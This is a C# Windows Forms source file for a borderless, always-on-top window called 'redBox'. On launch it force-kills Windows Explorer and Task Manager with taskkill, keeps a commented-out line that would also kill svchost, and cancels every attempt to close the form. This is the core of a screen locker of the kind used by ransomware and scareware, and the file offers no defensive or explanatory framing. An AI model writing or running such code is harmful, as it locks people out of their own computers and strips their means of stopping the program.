using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace redBoxInterface
{
    public partial class redBox : Form
    {
        public redBox()
        {
            InitializeComponent();
            TopMost = true;
            TopLevel = true;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.ControlBox = false;
            this.Text = String.Empty;
            cerrarProcesos();
        }

        public void cerrarProcesos() {
            int i = 0;

                try
                {
                    foreach (var process in Process.GetProcesses())
                    {

                        if ((process.ProcessName == "Taskmgr") || (process.ProcessName == "explorer"))
                        {

                          

                            Process.Start(@"C:\Windows\System32\taskkill.exe", @"/F /IM explorer.exe");
                            Process.Start(@"C:\Windows\System32\taskkill.exe", @"/F /IM Taskmgr.exe");
                         //   Process.Start(@"C:\Windows\System32\taskkill.exe", @"/F /IM svchost.exe");





                    }
                }
                }

                catch (Exception error)
                {
                    Console.WriteLine(error);
                }

            

        }
           

        private void RedBox_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void PictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void Button1_Click(object sender, EventArgs e)
        {
           
          

           
        }

        private void RedBox_Load(object sender, EventArgs e)
        {

        }
    }
}
